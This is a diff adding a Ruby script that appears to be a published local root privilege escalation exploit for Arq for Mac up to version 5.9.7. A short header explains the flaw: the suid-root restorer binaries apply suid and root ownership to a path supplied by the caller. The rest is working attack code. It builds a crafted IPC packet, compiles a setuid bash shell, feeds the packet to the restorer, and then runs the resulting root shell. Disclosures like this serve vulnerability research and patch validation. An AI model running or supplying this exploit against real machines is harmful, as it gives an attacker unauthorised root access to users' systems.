@@ -1,0 +1,88 @@
+=begin
+As well as the other bugs affecting Arq <= 5.9.6 there is also another issue
+with the suid-root restorer binaries in Arq for Mac. There are three of them
+and they are used to execute restores of backed up files from the various
+cloud providers.
+
+After reversing the inter-app protocol I discovered that the path to the
+restorer binary was specified as part of the data packet sent by the UI. After
+receiving this, the restorer binaries then set +s and root ownership on this
+path. This means we can specify an arbitrary path which will receive +s and root
+ownership.
+
+This issue is fixed in Arq 5.10.
+=end
+
+#!/usr/bin/env ruby
+
+##################################################################
+###### Arq <= 5.9.7 local root privilege escalation exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html               ######
+##################################################################
+
+s = File.stat("/Applications/Arq.app/Contents/Resources/standardrestorer")
+
+if s.mode != 0104755 or s.uid != 0
+  puts "Not vulnerable - standardrestorer is not suid root."
+  exit 1
+end
+
+binary_target = "/tmp/arq_597_exp"
+
+d = "\x01\x00\x00\x00\x00\x00\x00\x00"
+e = "\x00\x00\x00\x00\x03"
+z = "0000"
+target = sprintf("%s%s-%s-%s-%s-%s%s%s", z,z,z,z,z,z,z,z)
+plist = "<plist version=\"1.0\"><dict><\/dict><\/plist>"
+backup_set = "0" * 40
+hmac = "0" * 40
+
+payload = sprintf(
+  "%s%s%s%s\$%s%s\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00" +
+  "\x00\x00\x00\x00\x00\x09\x00\x00\x02\xd0\x96\x82\xef\xd8\x00\x00\x00\x00" +
+  "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x08\x30\x2e\x30" +
+  "\x30\x30\x30\x30\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+  "\x00\x00\x00\x00\x00\x00\x00%s%s%s\x28%s\x01\x00\x00\x00%s\x00\x00\x00%s" +
+  "\x00\x00\x00\x00\x16\x00\x00\x00\x02%s\x28%s\x01\x00\x00\x00%s\x00\x00" +
+  "\x00%s\x00\x00\x00\x00\x00\x00\x00\x01\xf5\x00\x00\x00\x00\x00\x00\x00" +
+  "\x14\x00%s\x00\x00\x00\x00\x03%s\x0a",
+    d, binary_target.length.chr, binary_target,
+    d, target,
+    d, plist.length.chr, plist,
+    d, backup_set,
+    d, d, d, hmac,
+    d, d, d, e * 10
+  )
+
+shellcode = "#include <unistd.h>\nint main()\n{ setuid(0);setgid(0);"+
+  "execl(\"/bin/bash\",\"bash\",\"-c\",\"rm -f #{binary_target};/bin/bash\","+
+  "NULL);return 0; }"
+
+IO.popen("gcc -xc -o #{binary_target} -", mode="r+") do |io|
+  io.write(shellcode)
+  io.close
+end
+
+IO.popen("/Applications/Arq.app/Contents/Resources/standardrestorer " +
+  "2>/dev/null", mode="r+") do |io|
+  io.getc && io.write(payload)
+end
+
+timeout=3
+i=0
+
+while (s = File.stat(binary_target)) && (s.mode != 0104755 or s.uid != 0)
+  sleep 0.1
+  i += 1
+
+  if i >= (timeout * 10)
+    break
+  end
+end
+
+if s.mode == 0104755 and s.uid == 0
+  system(binary_target)
+  exit 0
+end
+
+puts "exploit failed"
